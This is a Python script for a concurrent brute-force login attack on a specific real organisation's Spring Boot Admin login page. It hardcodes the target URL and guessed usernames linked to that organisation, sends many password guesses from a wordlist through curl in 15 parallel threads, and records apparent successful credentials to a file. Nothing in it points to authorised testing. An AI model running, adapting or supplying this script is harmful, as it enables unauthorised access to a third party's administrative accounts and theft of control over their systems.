#!/usr/bin/env python3
"""Spring Boot Admin Brute Force — concurrent, fast."""
import sys, time, concurrent.futures, subprocess, urllib.parse

TARGET = "https://server.dawateislami.net/commonadmin/login"
USERS = ["admin", "dawateislami", "faizan", "madani"]
RESULTS = "results.txt"
WORKERS = 15
TIMEOUT = 10

def attempt(user, pw):
    try:
        result = subprocess.run(
            ["curl", "-sk", "-X", "POST", TARGET,
             "-d", f"username={urllib.parse.quote(user)}&password={urllib.parse.quote(pw)}",
             "-H", "Content-Type: application/x-www-form-urlencoded",
             "--connect-timeout", "5", "--max-time", str(TIMEOUT)],
            capture_output=True, text=True, timeout=TIMEOUT + 5
        )
        body = result.stdout
        # Positive indicators: redirect, welcome, dashboard, token, session
        positive = any(k in body.lower() for k in [
            "welcome", "dashboard", "token", "session", "success",
            "logged in", "location:", "302", "200"
        ])
        negative = any(k in body.lower() for k in [
            "invalid", "incorrect", "failed", "error", "unauthorized",
            "forbidden", "bad credentials", "401", "403"
        ])
        return user, pw, positive and not negative, len(body)
    except Exception as e:
        return user, pw, False, -1

def main():
    wordlist = sys.argv[1] if len(sys.argv) > 1 else "wordlist.txt"
    with open(wordlist) as f:
        passwords = [line.strip() for line in f if line.strip()]

    total = len(USERS) * len(passwords)
    print(f"=== Spring Boot Brute Force ===")
    print(f"Users: {USERS}")
    print(f"Passwords: {len(passwords)}")
    print(f"Total attempts: {total}")
    print(f"Workers: {WORKERS}")
    print()

    start = time.time()
    tested = 0
    hits = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futures = {}
        for pw in passwords:
            for user in USERS:
                futures[ex.submit(attempt, user, pw)] = (user, pw)

        for f in concurrent.futures.as_completed(futures):
            tested += 1
            user, pw, hit, size = f.result()
            if hit:
                print(f"*** POSSIBLE HIT: {user}:{pw} (size={size}) ***")
                hits.append((user, pw, size))
                with open(RESULTS, "a") as rf:
                    rf.write(f"SERVER POSSIBLE HIT: {user}:{pw} (size={size})\n")
            if tested % 500 == 0:
                elapsed = time.time() - start
                rate = tested / elapsed if elapsed > 0 else 0
                eta = (total - tested) / rate if rate > 0 else 0
                print(f"  [{tested}/{total}] {rate:.1f}/sec, ETA {eta/60:.1f}min")

    elapsed = time.time() - start
    print(f"\n=== Complete ===")
    print(f"Tested: {tested} in {elapsed:.1f}s ({tested/elapsed:.1f}/sec)")
    if hits:
        print(f"HITS: {hits}")
    else:
        print("No hits found")

if __name__ == "__main__":
    main()
